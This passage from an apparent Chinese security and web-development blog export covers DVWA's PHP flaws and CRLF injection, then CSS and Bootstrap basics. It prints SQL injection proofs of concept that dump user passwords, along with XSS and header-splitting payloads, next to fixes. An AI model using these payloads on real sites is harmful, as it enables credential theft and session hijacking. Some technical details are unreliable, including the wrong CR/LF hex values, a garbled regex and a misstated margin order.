<li>HttpOnly，会阻止XSS攻击将你的用户cookie发给黑客</li>
<li>Secure,属性能让Cookie通过HTTPS连接，而不是HTTP，这样，能够访问你的网络的黑客无法读取未加密的Cookie。</li>
</ul>
<blockquote>
<p>add_header Set-Cookie: HttpOnly</p>
<p>add_header Set-Cookie: Secure</p>
</blockquote>
]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> XSS </tag>
            
            <tag> 安全开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[从DVWA中学习PHP常见漏洞及防御]]></title>
      <url>/2016/09/01/%E4%BB%8EDVWA%E4%B8%AD%E5%AD%A6%E4%B9%A0PHP%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%8F%8A%E9%98%B2%E5%BE%A1/</url>
      <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>“安全是一个整体，保证安全不在于强大的地方有多强大 而在于真正薄弱的地方在哪里”–剑心</p>
<p>漏洞形成的原因就是接受了不安全的变量输入，又没得到有效的过滤，最后进入一些对敏感的函数就会对安全造成威胁。比如出现在<code>mysql_query()</code>函数可能就会造成SQL注入漏洞，出现在<code>eval()</code>以及<code>preg_replace()</code>中可能导致代码的执行。<br><a id="more"></a></p>
<p>主要介绍DVWA上的漏洞及修复方案：<br><a href="https://github.com/RandomStorm/DVWA/archive/v1.0.8.zip" target="_blank" rel="external">DVWA下载地址</a></p>
<h1 id="0x01-SQL注入漏洞"><a href="#0x01-SQL注入漏洞" class="headerlink" title="0x01 SQL注入漏洞"></a>0x01 SQL注入漏洞</h1><p>low的级别下$id变量没有经过任何的过滤，直接传入了sql语句，造成字符型注入</p>
<p>POC:</p>
<blockquote>
<p>‘ union select user,password from users#</p>
</blockquote>
<p>SQL语句为：</p>
<blockquote>
<p>SELECT first_name, last_name FROM users WHERE user_id = ‘’ union select user,password from users#</p>
</blockquote>
<p>medium级别下虽然$id经过了mysql_real_escape_string转义了<code>’</code>，可是因为后面的SQL语句$id没有单引号保护，会被系统认为是数值型，导致数值型注入</p>
<p>POC:</p>
<blockquote>
<p>1 union select user,password from users</p>
</blockquote>
<p>SQL语句为：</p>
<blockquote>
<p>SELECT first_name, last_name FROM users WHERE user_id = 1 union select user,password from users</p>
</blockquote>
<p><strong>SQL注入修补方法</strong></p>
<p>字符型注入漏洞修补方法：</p>
<p>PHP5.3之前版本在php.ini中设置<code>magic_quotes_gpc=On</code>; <code>magic_quotes_quotes_gpc</code>会对传入的$_POST,$_GET,$_SERVER里的 ‘,”,\进行转义。</p>
<p>但是PHP5.4之后，<code>magic_quotes_quotes_gpc</code>就被废除了。</p>
<p>还要使用<code>mysql_real_escape_string()</code>或<code>addslashes()</code>对传入参数进行过滤，或者使用<code>str_replace()</code>对一些关键词进行替换。</p>
<p>但是<code>addslashes()</code>和<code>mysql_real_escape_string()</code>在数据库字符集设为GBK时是可能被绕过的。</p>
<p>如果数据库字符集是GBK的情况下，可以把</p>
<pre><code>$mysqli-&gt;query(&apos;SET NAMES gbk&apos;); 
</code></pre><p>修改为：</p>
<pre><code>$mysqli-&gt;set_charset(&apos;gbk&apos;);
</code></pre><p>数值型注入：</p>
<p>数值型注入比较好修补，只需要判断传入的变量是否为数值型就可以了(或者强行改成数值型<code>mysql_numrows</code>)</p>
<h1 id="0x02-XSS漏洞"><a href="#0x02-XSS漏洞" class="headerlink" title="0x02 XSS漏洞"></a>0x02 XSS漏洞</h1><p>黑客往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到黑客的特殊目的，比如窃取用户cookies.或者进行其他操作。</p>
<p>low级别下$message,$name两个变量从<code>$_POST</code>传入,只是经过一些特殊字符的转换。并没有对尖括号进行转义,所以还是造成了XSS的产生。</p>
<p>POC:</p>
<blockquote>
<p><code>&lt;script&gt;alert(1)&lt;script&gt;</code></p>
</blockquote>
<p>medium级别下，虽然对$message进行了尖括号转义，而且对<code>&lt;script&gt;</code>进行了替换，但是$name没有进行转义，而且跨站脚本可以用多种标签，如<code>&lt;img /&gt;</code>,等…。Name的<code>&lt;input /&gt;</code>限制了<code>maxlength=‘10’</code>的长度，但是我们的防御对象是精通技术的黑客。这种html下的长度限制是可以直接通过浏览器修改..然后通过大小写成功绕过<code>str_replace()</code>，插入XSS.</p>
<p>POC:</p>
<blockquote>
<p><code>&lt;SCript&gt;alert(1)&lt;/SCript&gt;</code></p>
</blockquote>
<p><strong>XSS修复方法</strong></p>
<p>在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码</p>
<p>在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码</p>
<p>在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码</p>
<p>在将不可信数据插入到Style属性里时，对这些数据进行CSS编码</p>
<p>在将不可信数据插入到HTML URL里时，对这些数据进行URL编码</p>
<p>使用富文本时，使用XSS规则引擎进行编码过滤</p>
<p>其实使用htmlspecialchars()在输出时对输出内容进行转义。在输出时进行转义比输入时进行转义效果更好，因为可以确保数据在入库时是完整的….不然丢失数据。</p>
<h1 id="0x03-任意命令执行漏洞"><a href="#0x03-任意命令执行漏洞" class="headerlink" title="0x03 任意命令执行漏洞"></a>0x03 任意命令执行漏洞</h1><p>参考文章：<a href="http://byd.dropsec.xyz/2016/07/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">命令执行漏洞总结</a></p>
<h1 id="0x04-暴力破解"><a href="#0x04-暴力破解" class="headerlink" title="0x04 暴力破解"></a>0x04 暴力破解</h1><p>加个google验证码，保证没有程序能识别出来…</p>
<h1 id="0x05-文件包含漏洞"><a href="#0x05-文件包含漏洞" class="headerlink" title="0x05 文件包含漏洞"></a>0x05 文件包含漏洞</h1><p>参考文章：<a href="http://byd.dropsec.xyz/2016/07/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">文件包含漏洞总结</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 爆破 </tag>
            
            <tag> 编程 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> XSS </tag>
            
            <tag> PHP </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 安全开发 </tag>
            
            <tag> DVWA </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CRLF漏洞]]></title>
      <url>/2016/08/31/CRLF-injection%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>在文本处理中, CR, LF, CR/LF是不同操作系统上使用的换行符.Dos和windows采用回车+换行CR/LF表示下一行,而UNIX/Linux采用换行符LF表示下一行，苹果机(MAC OS系统)则采用回车符CR表示下一行.CR用符号’r’表示, 十进制ASCII代码是13, 十六进制代码为0x0D; LF使用’n’符号表示, ASCII代码是10, 十六制为0x0A.所以Windows平台上换行在文本文件中是使用 0d 0a 两个字节表示, 而UNIX和苹果平台上换行则是使用0a或0d一个字节表示.</p>
<a id="more"></a>
<h1 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h1><p><font color="#000ff">我们都知道，HTTP协议是依靠两个CRLF，即\r\n来分割HTTP头部及响应体。基于这个认知，可以推出，HRS问题是由于服务端程序没有过滤掉头部中的特殊字符%0D%0A，直接输出到了返回的数据中，导致错误的解析。而在日常开发中，最常见的莫过于有以下的两种功能（1）URL跳转（2）Cookie的设置中出现。<font></font></font></p>
<p>一旦我们能够控制http头，通过注入一些CRLF这样就可以控制header和body的分割线，这样我们就可以向body或是header中注入些东西了。所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p>
<h1 id="0x02-危害"><a href="#0x02-危害" class="headerlink" title="0x02 危害"></a>0x02 危害</h1><p>如果目标网页存在响应头部CRLF注入，在HTTP响应头注入回车换行符，就可以注入头部：<br>X-XSS-Protection: 0</p>
<pre><code>HTTP header的定义就是基于这样的&quot;Key: Value&quot;的结构，用CRLF命令表示一行的结尾。
&quot;Location:&quot;头用来表示重定向的URL地址，
&quot;Set-Cookie:&quot;头用来设置cookies。
如果用户的输入经过验证，其中存在CRLF的字符就可以被用来达到欺骗的目的。
</code></pre><h1 id="0x03-实例"><a href="#0x03-实例" class="headerlink" title="0x03 实例"></a>0x03 实例</h1><p>测试代码：<br>index.php</p>
<pre><code>&lt;?php 
/*
*@博客：http://byd.dropsec.xyz/
*@Author：w2n1ck
*/
echo &apos;&lt;pre&gt;&apos;;
print_r(file(&quot;http://www.site1.com/api?test=$test&quot;/images/test.png)); 
echo &apos;&lt;/pre&gt;&apos;;
?&gt; 
</code></pre><p>如果攻击者这样发送：</p>
<blockquote>
<p>index.php?test=test%20HTTP /1.0%0D%0AHost%3A%20www.site2.com%0D%0AUser-Agent%3A%20joy_nick/0.0%0D%0AReferer%3A%20http%3A%2F%2Fwww.test.org%2F%0D%0ACookie%3A%20user%3Djoy_nick%0D%0A%0D%0AHTTP/1.0%0D%0AHost%3A%20http%3A%2F%2Fwww.SITE1.com%0D%0AUser-Agent%3A%20PHP/4.1.2</p>
</blockquote>
<p>(必须在一行上) </p>
<p>这个 HTTP 请求将被发送给 www.site1.com:  </p>
<pre><code>GET /api?test=test HTTP/1.0 
Host: www.site2.com
User-Agent: joy_nick/0.0 
Referer: http://www.test.org/ 
Cookie: user=joy_nick

HTTP/1.0 
Host: www.site1.st 
User-Agent: PHP/4.1.2
</code></pre><p>你可以看到，真实的PHP头信息被正确发送，但被服务器忽略了，因为在它们指向的报头结束之前我们发送两个CRLF。 </p>
<p>利用此缺陷，攻击者能够任意添加用户代理（user-agent），referers 和 cookies。如果站点1和站点2是同一台服务器上的虚拟主机，即使index.php有限制，攻击者也能绕过其限制非法访问站点2。</p>
<p>还有一个xss的能够轻松绕过filter的XSS，如果我们输入：</p>
<blockquote>
<p><a href="http://www.xxx.com%0d%0a%0d%0a%3Csvg%2fonload%3dprompt%281%29%3E" target="_blank" rel="external">http://www.xxx.com%0d%0a%0d%0a%3Csvg%2fonload%3dprompt%281%29%3E</a></p>
</blockquote>
<pre><code>HTTP/1.1 200 ok
Date: XXX
Content-Type: text/html
Content-Length: 154
Connection: close

&lt;svg/onload=prompt(1)&gt;
</code></pre><p>从而形成XSS漏洞</p>
<h1 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h1><ol>
<li>您需要限制用户输入CR（0x13）和LF（为0x10）或正确编码的输出，以防止自定义HTTP标头注射。</li>
<li>通过在PHP脚本中嵌入如下指令，确保所有这种类型的URL变量在使用时已被清空：  </li>
</ol>
<blockquote>
<p>$var = preg_replace(’///s+/’, ’, $var); </p>
</blockquote>
<ol>
<li>如果你的脚本不需要访问URLs，建议在php.ini中关闭allow_url_fopen </li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> CRLF </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> XSS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[前端开发基础知识]]></title>
      <url>/2016/08/29/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      <content type="html"><![CDATA[<h2 id="CSS盒子模型"><a href="#CSS盒子模型" class="headerlink" title="CSS盒子模型"></a>CSS盒子模型</h2><p>网页设计中常听的属性名：内容(content)、填充(padding)、边框(border)、边界(margin)， CSS盒子模式都具备这些属性。</p>
<p>元素实际占用尺寸 = width(height) + padding + border + margin</p>
<a id="more"></a>
<h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2><h3 id="CSS1-定义的选择器"><a href="#CSS1-定义的选择器" class="headerlink" title="CSS1 定义的选择器"></a>CSS1 定义的选择器</h3><ol>
<li>元素选择器：E</li>
<li>ID选择器：#id</li>
<li>类选择器：E.class</li>
<li>包含选择器：E F</li>
<li>伪类选择器：E:link、E:visited、E:active、E:hover、E:focus</li>
<li>伪元素：E:first-link、E:first-letter</li>
</ol>
<h3 id="CSS2-1-增加的选择器"><a href="#CSS2-1-增加的选择器" class="headerlink" title="CSS2.1 增加的选择器"></a>CSS2.1 增加的选择器</h3><ol>
<li>通配选择器：* (星号)</li>
<li>伪类选择器：E:lang(fr)</li>
<li>子包含选择器：E &gt; F</li>
<li>相邻兄弟选择器：E + F</li>
<li>伪元素：E:before、E:after</li>
<li>属性选择器：E[foo]、E[foo=”bar”]、E[foo~=”bar”]、E[foo|=”bar”]</li>
</ol>
<h3 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h3><p><img src="http://oa8y5guqs.bkt.clouddn.com/%E5%89%8D%E7%AB%AF1.png" alt=""></p>
<p>※同级后来居上</p>
<p>例如：</p>
<p>HTML代码：</p>
<pre><code>&lt;ul class=&quot;list&quot;&gt;
    &lt;li&gt;one&lt;/li&gt;
    &lt;li&gt;two&lt;/li&gt;
    &lt;li&gt;three&lt;/li&gt;
&lt;/ul&gt;
</code></pre><p>CSS代码：</p>
<pre><code>ul li{color:#000;}
1 + 1 =2
.list li{color:#f00;}
10 + 1 =11
</code></pre><p><code>.list li</code> 的优先级更高，所以浏览器会显示 .list li 设置的样式</p>
<p>其实说白了，就是后面的会把前面的覆盖掉，内敛的会把link的覆盖掉，然后再整合。</p>
<h2 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h2><h3 id="浮动-float"><a href="#浮动-float" class="headerlink" title="浮动 (float)"></a>浮动 (float)</h3><ol>
<li>none：不浮动（默认值）</li>
<li>left：左浮动</li>
<li>right：右浮动</li>
</ol>
<p>解释：</p>
<pre><code>浮动什么意思呢，比如，默认的，我们知道，div是占满一行的，现在我们想把两个div显示在一行上，那怎么办呢
&lt;div style=&quot;width:100px;&quot;&gt;11111&lt;/div&gt;&lt;div style=&quot;width:150px&quot;&gt;2222&lt;/div&gt;
这样我们就设置了两个div，一个宽度100px,一个宽150px,可预览一下，我们的div仍在两行上，那么怎么把它改到一行上呢，这儿就需要float，设置第一个div的float为left
&lt;div style=&quot;width:100px;float:left;&quot;&gt;11111&lt;/div&gt;&lt;div style=&quot;width:150px&quot;&gt;2222&lt;/div&gt;
再预览，就可以看到，它们到一行上了。
clear是什么意思呢，clear是清除的意思，它有三个值，left,right,both
很好理解，如果设置了clear:left，它就不怕它的左边有float，同理clear:right,clear:both，是左右都不让有float
举个例子，还是上面的
我们设置第二个div的clear:left,也就是不让它左边有float
&lt;div style=&quot;width:100px;float:left;&quot;&gt;11111&lt;/div&gt;&lt;div style=&quot;width:150px;clear:left;&quot;&gt;2222&lt;/div&gt;
我们预览一下，就可以看到，尽管第一个div已经float:left了，这两个div仍然在两行上，就是由于第二个div不让它左边有float
因为css的定义是后面的可以覆盖前面的，明白了吧
</code></pre><h3 id="清浮动-clear-both"><a href="#清浮动-clear-both" class="headerlink" title="清浮动-clear-both"></a>清浮动-clear-both</h3><p>HTML代码：</p>
<pre><code>&lt;div class=&quot;layout&quot;&gt;
    &lt;div class=&quot;left&quot;&gt;left&lt;/div&gt;
    &lt;div class=&quot;right&quot;&gt;right&lt;/div&gt;
    &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;
&lt;/div&gt;
</code></pre><p>CSS代码：</p>
<pre><code>.layout{}
.left{float:left}
.right{float:right}
.clear{clear:both}
</code></pre><h3 id="清浮动-overflow-hidden"><a href="#清浮动-overflow-hidden" class="headerlink" title="清浮动-overflow:hidden"></a>清浮动-overflow:hidden</h3><p>HTML代码：</p>
<pre><code>&lt;div class=&quot;layout&quot;&gt;
    &lt;div class=&quot;left&quot;&gt;left&lt;/div&gt;
    &lt;div class=&quot;right&quot;&gt;right&lt;/div&gt;
&lt;/div&gt;
</code></pre><p>CSS代码：</p>
<pre><code>.layout{overflow:hidden;zoom:1;}
.left{float:left}
.right{float:right}
</code></pre><h3 id="定位-position"><a href="#定位-position" class="headerlink" title="定位 (position)"></a>定位 (position)</h3><ol>
<li>static-没有定位（默认值）</li>
<li>relative-相对定位</li>
<li>absolute-绝对定位</li>
<li>fixed-固定定位</li>
</ol>
<h3 id="层级"><a href="#层级" class="headerlink" title="层级"></a>层级</h3><ol>
<li>层级 (z-index) - 后来居上</li>
<li>层级 (z-index) - 定位元素高于非定位元素</li>
<li>层级 (z-index) - 同为定位元素则比较 z-index</li>
</ol>
<h3 id="隐藏与显示"><a href="#隐藏与显示" class="headerlink" title="隐藏与显示"></a>隐藏与显示</h3><ol>
<li>隐藏元素：display:none;visibility:hidden;</li>
<li>显示元素：display:block;visibility:visible;</li>
</ol>
<p>※ “display” 在 块级元素&amp;行内元素 中再详细介绍</p>
<h2 id="CSS-Reset"><a href="#CSS-Reset" class="headerlink" title="CSS Reset"></a>CSS Reset</h2><pre><code>html,body,div,ul,ol,li,dl,dt,dd,h1,h2,h3,h4,h5,h6,p,table,th,td,fieldset,
form,input,button,textarea,hr,blockquote,pre{margin:0;padding:0;}
h1,h2,h3,h4,h5,h6{font-size:100%; font-weight:bold;line-height:1em;}
ul,ol,dl{list-style-type:none;}
fieldset,img{border:none;}
table{border-collapse:collapse;table-layout:fixed;empty-cells:show;}
address,caption,cite,code,dfn,th{font-style:normal;font-weight:normal;}
ins{text-decoration:underline;}
del{text-decoration:line-through;}
q:before,q:after{content:&quot;&quot;;}
</code></pre><p><strong>注意事项：</strong></p>
<p>不要使用 *{margin:0;padding:0;}</p>
<p>最2B的 Reset： div{float:left;}</p>
<h2 id="CSS-优化"><a href="#CSS-优化" class="headerlink" title="CSS 优化"></a>CSS 优化</h2><h3 id="属性简写-外边距"><a href="#属性简写-外边距" class="headerlink" title="属性简写-外边距"></a>属性简写-外边距</h3><pre><code>margin:10px 15px 20px 25px;
        下     上 右    左 顺时针方向

margin:10px;
        上下左右统一设置

margin:10px 15px;
        上下 左右
</code></pre><h3 id="属性简写-内边距"><a href="#属性简写-内边距" class="headerlink" title="属性简写-内边距"></a>属性简写-内边距</h3><pre><code>padding:10px 15px 20px 25px;
        下     上  右     左 简写方式与 margin 相同
</code></pre><h3 id="属性简写-背景"><a href="#属性简写-背景" class="headerlink" title="属性简写-背景"></a>属性简写-背景</h3><pre><code>background:#ff0000 url(bg.jpg) no-repeat fixed   top center;
            颜色     图像       平铺方式   滚动方式 图像开始位置
</code></pre><p>可以省略部分值</p>
<p>background:#f00;</p>
<p>background:url(bg.jpg) no-repeat;</p>
<h3 id="属性简写-边框"><a href="#属性简写-边框" class="headerlink" title="属性简写-边框"></a>属性简写-边框</h3><pre><code>border:1px solid #ff0000;
       宽度 样式  颜色
</code></pre><p>可以省略部分值</p>
<p>border:solid #f00;</p>
<p>border:1px solid;</p>
<h3 id="属性简写-字体"><a href="#属性简写-字体" class="headerlink" title="属性简写-字体"></a>属性简写-字体</h3><pre><code>font:italic bold 15px/20px &quot;微软雅黑&quot;
       斜体  粗体   字号/行高 字体名称
</code></pre><p>字号与字体名称是必须的，其他值可省略</p>
<p>font:15px “微软雅黑”;</p>
<p><strong>注意事项：</strong></p>
<p>简写中省略不写的属性，将使用默认值，而不是继承。</p>
<h3 id="属性继承"><a href="#属性继承" class="headerlink" title="属性继承"></a>属性继承</h3><p>文本相关的样式会继承</p>
<p>列表相关的样式会继承</p>
<p>颜色属性会继承</p>
<h3 id="选择器优化"><a href="#选择器优化" class="headerlink" title="选择器优化"></a>选择器优化</h3><p>从右到左的解析顺序</p>
<pre><code>body ul li a {color:#f00;}
4     3   2  1
</code></pre><p>选择器的效率</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E5%89%8D%E7%AB%AF2.png" alt=""></p>
<p>※在一些 JavaScript 库中的选择器，也适用于该效率。（例如：jQuery）</p>
<p>属性继承，减少选择器</p>
<pre><code>.box { padding:10px; }
.box p { color:#333; }
</code></pre><p>简化为：</p>
<pre><code>.box { padding:10px ; color:#333; }
</code></pre><h3 id="书写顺序"><a href="#书写顺序" class="headerlink" title="书写顺序"></a>书写顺序</h3><pre><code>显示属性            自身属性            文本属性
display         top                color
visibility        left            font
overflow        width            line-height
position        height            text-align
float            margin            text-decoration
clear            padding            text-indent
                border            text-transform
                outline            vertical-align
                background        white-space
                                content
</code></pre><h2 id="标签-amp-语义"><a href="#标签-amp-语义" class="headerlink" title="标签&amp;语义"></a>标签&amp;语义</h2><p><img src="http://oa8y5guqs.bkt.clouddn.com/%E5%89%8D%E7%AB%AF3.png" alt=""></p>
<h2 id="块元素-amp-行内元素"><a href="#块元素-amp-行内元素" class="headerlink" title="块元素&amp;行内元素"></a>块元素&amp;行内元素</h2><p><strong>块元素 (block)</strong></p>
<p>div p h1~h6 ul ol li dl dt dd table form …</p>
<p><strong>行内元素 (inline)</strong></p>
<p>span a img em strong select input textarea …</p>
<p>行内元素无法设置一些CSS属性，例如：</p>
<pre><code>width, height, margin-top, margin-bottom,
padding-top padding-bottom, text-index …
</code></pre><p>※可以使用 display 来改变</p>
<p><strong>display 常用属性</strong></p>
<p>完整属性查阅：<a href="http://www.w3school.com.cn/css/pr_class_display.asp" target="_blank" rel="external">http://www.w3school.com.cn/css/pr_class_display.asp</a></p>
<ol>
<li>inline 设置为行内元素</li>
<li>block 设置为块元素</li>
<li>inline-block 设置为行内块元素*</li>
<li>none 元素不会被显示</li>
</ol>
<p><strong>嵌套规则</strong></p>
<p>块元素内能包含所有行内元素</p>
<p>行内元素不能包含块元素</p>
<p><strong>以下块元素中不能包含块元素</strong></p>
<p>h1~h6, p, dt, address</p>
<h2 id="HTML5-简单应用"><a href="#HTML5-简单应用" class="headerlink" title="HTML5 简单应用"></a>HTML5 简单应用</h2><pre><code>DocType
&lt;!DOCTYPE HTML&gt;
字符集
&lt;meta charset=&quot;utf-8&quot;&gt;
外链 css 文件
&lt;link rel=&quot;stylesheet&quot; href=“filename.css&quot;&gt;
外链 javascript 文件
&lt;script src=“filename.js&quot;&gt;&lt;/script&gt;
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 编程 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[BootStrap学习笔记]]></title>
      <url>/2016/08/29/BootStrap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h1 id="BootStrap是什么"><a href="#BootStrap是什么" class="headerlink" title="BootStrap是什么"></a>BootStrap是什么</h1><p>BootStrap是基于HTML、CSS和JavaScript的框架，使你只需要写简单的代码就可以很快的搭建一个还不错的前端界面，它是后端程序员的福音，使他们只需要专注业务逻辑，而无须浪费太多的精力在界面设计上。</p>
<a id="more"></a>
<p><strong>全响应</strong></p>
<p>它可以开发全响应式网页——不论你使用手机、平板电脑、普通个人电脑浏览网站内容，所有的元素都可以很优雅的呈现，减轻了因为兼容性而带来的工作量。</p>
<p><strong>版本</strong></p>
<p>它的最新版本是4.0，国内目前用的较多的是3.x,本教程也基于BootStrap3.x版本。</p>
<p><strong>二次开发</strong></p>
<p>你可以使用默认的BootStrap样式、组件和插件，你也可以对其进行二次开发，甚至你还可以基于BootStrap环境使用自己开发的组件。</p>
<p>你可以登陆<code>http://v3.bootcss.com</code>点击页面中的<code>下载BootStrap</code>按钮下载完整版。</p>
<p>1.首先把它的文件按照类别放在项目的文件夹中</p>
<p>你可以把CSS文件——bootstrap.min.css放在类似stylesheets这样专门放CSS的文件夹。把js文件——bootstrap.min.js放在类似Scripts文件夹中。当然，最终如何部署可以按照你的个人喜好。</p>
<p>2.在页面中使用BootStrap</p>
<p>将BootStrap的文件bootstrap.min.css、bootstrap.min.js引入当前页面中，由于BootStrap是基于Jquery的，所以在引入它的js文件之前，一定要先引入Jquery.js。注意：这里考虑到文件大小，我们引入了min版的文件，当然，你也可以引入完整版的文件。</p>
<p>示例代码如下：</p>
<pre><code>&lt;!-- Bootstrap 核心 CSS 文件 --&gt;&lt;/p&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;/stylesheets/bootstrap.min.css&quot;&gt;

&lt;!-- jQuery文件 --&gt;
&lt;script src=&quot;/scripts/jquery.min.js&quot;&gt;&lt;/script&gt;

&lt;!-- Bootstrap 核心 JavaScript 文件 --&gt;
&lt;p&gt;&lt;script src=&quot;/scripts/bootstrap.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="BootStrap栅格布局"><a href="#BootStrap栅格布局" class="headerlink" title="BootStrap栅格布局"></a>BootStrap栅格布局</h2><p>BootStrap栅格布局是灵活使用BootStrap的基础。BootStrap将屏幕分为12等分，在具体的DIV中，可以通过设置DIV的所占等分的数字确定其在屏幕中占有的宽度。如：</p>
<pre><code>&lt;div class=&quot;row“&gt;&lt;!--表示另起一行--&gt;
      &lt;div class=&quot;col-md-8&quot; style=&quot;border:1px solid black;height:100px;&quot;&gt;&lt;/div&gt;
      &lt;div class=&quot;col-md-4&quot; style=&quot;border:1px solid black;height:100px;&quot;&gt;&lt;/div&gt;
&lt;/div&gt;
</code></pre><p>在第一个DIV中<code>class=&quot;col-md-8&quot;</code>,第二个DIV中<code>class=&quot;col-md-4&quot;</code>, 其中‘8’和‘4’就是其DIV所占屏幕宽度的数值，加在一起等于‘12’。也就是第一个DIV占整个屏幕宽度的‘8/12’,第二个DIV占‘4/12’。 注：在上述代码中为了突显区块，我们设置了DIV的边框宽度为1像素黑色实线，高度设为100像素。</p>
<h2 id="布局屏幕分类"><a href="#布局屏幕分类" class="headerlink" title="布局屏幕分类"></a>布局屏幕分类</h2><p>BootStrap是一种全响应的技术，那么针对不同的屏幕，它是怎么提供支持的呢？ 别担心，针对不同的显示屏幕尺寸，BootStrap提供了不同的栅格布局的属性：</p>
<ol>
<li>col-xs-* 超小屏幕 手机 (&lt;768px)</li>
<li>col-sm-* 小屏幕 平板 (≥768px)</li>
<li>col-md-* 中等屏幕 桌面显示器 (≥992px)</li>
<li>col-lg-* 大屏幕 大桌面显示器 (≥1200px)</li>
</ol>
<h2 id="多个布局属性"><a href="#多个布局属性" class="headerlink" title="多个布局属性"></a>多个布局属性</h2><p>如果想让一个DIV在不同的屏幕中占有不同的屏宽该怎么做呢？ BootStrap允许我们在一个DIV中写多个类别的布局属性，从而让该DIV在不同的屏幕中呈现不同的屏宽。如：</p>
<pre><code>&lt;div class=&quot;row&quot;&gt;
      &lt;div class=&quot;col-md-8 col-xs-6 col-lg-4&quot;&gt;&lt;/div&gt;
&lt;/div&gt;
</code></pre><p>该DIV在中等屏幕中占有‘8/12’，在手机中占有‘6/12’，在大屏幕中占有屏幕比例的‘4/12’。</p>
<h1 id="网站首页整体设计思路"><a href="#网站首页整体设计思路" class="headerlink" title="网站首页整体设计思路"></a>网站首页整体设计思路</h1><h2 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h2><p>一般而言首页设计几乎等同与整个网站设计，那么首页中到底应该放些什么内容才好呢？这要看网站有哪些主要的元素。本教程里要设计的网站首页是一个多用户博客类的网站首页，在该网站中用户可以发表博客，也可以推荐图书给其他用户。所以，首页中的板块包括这些应该是恰当的：</p>
<ul>
<li><p>整站导航条</p>
</li>
<li><p>文章（博客）展示板块</p>
</li>
<li><p>图书展示板块</p>
</li>
<li><p>用户（会员）展示板块</p>
</li>
<li><p>脚注——footer部分</p>
</li>
</ul>
<p>其中导航条和脚注是整个网站中都要用到的，具体实现时可以放在布局模板中。</p>
<h2 id="板块划分"><a href="#板块划分" class="headerlink" title="板块划分"></a>板块划分</h2><p>根据上面的整体架构，我们将首页的板块分为以下几个：</p>
<p><strong>1.文章板块</strong>——将最新、最热的文章以标签页（tab）切换方式放在该模块中，为了页面美观，将有图片的文章的第一章图片放在轮换图片（caoursel）插件中,最右侧放置热门文章分类。</p>
<p><strong>2.图书板块</strong>——按照图书的分类将图书放在首页中，点击不同的分类切换到不同的选项卡。图书展示使用自己开发的Jquery Tab插件，并将其整合到BootStrap环境中。最右侧同样是图书的分类。</p>
<p><strong>3.用户板块</strong>——将新加入的用户和对社区贡献最多的用户放在首页中</p>
<h2 id="要用到的BootStrap元素"><a href="#要用到的BootStrap元素" class="headerlink" title="要用到的BootStrap元素"></a>要用到的BootStrap元素</h2><p>那么，我么要用到哪些BootStrap元素才能很好的展示我们的板块内容呢？</p>
<p><strong>1.导航条</strong></p>
<p>这里要用到固定在网页头部的导航条（<code>navbar-fixed-top</code>）,并在其中整合用户登录模块，代码如下</p>
<pre><code>&lt;div class=&quot;navbar navbar-inverse navbar-fixed-top&quot; role=&quot;navigation&quot;&gt;
       &lt;div class=&quot;container&quot;&gt;
         &lt;div class=&quot;navbar-header&quot;&gt;
          &lt;a class=&quot;navbar-brand active&quot; href=&quot;首页URL&quot;&gt;顶求网&lt;/a&gt;
          &lt;a class=&quot;navbar-brand&quot; href=&quot;图书页面URL&quot;&gt;图书&lt;/a&gt;
          &lt;a class=&quot;navbar-brand&quot; href=&quot;文章页面URL&quot;&gt;文章&lt;/a&gt;
        &lt;/div&gt;
        &lt;div class=&quot;btn-group&quot; style=&quot;margin-top:10px; float:right;&quot;&gt;
            &lt;button type=&quot;button&quot; class=&quot;btn btn-default dropdown-toggle&quot; data-toggle=&quot;dropdown&quot;&gt;
          会员登陆 &lt;span class=&quot;caret&quot;&gt;&lt;/span&gt;
            &lt;/button&gt;
            &lt;ul class=&quot;dropdown-menu&quot; role=&quot;menu&quot;&gt;
               &lt;LI&gt;&lt;a href=&quot;会员登陆页面URL&quot;  target=&quot;_top&quot;&gt;会员登陆&lt;/a&gt;&lt;/LI&gt;
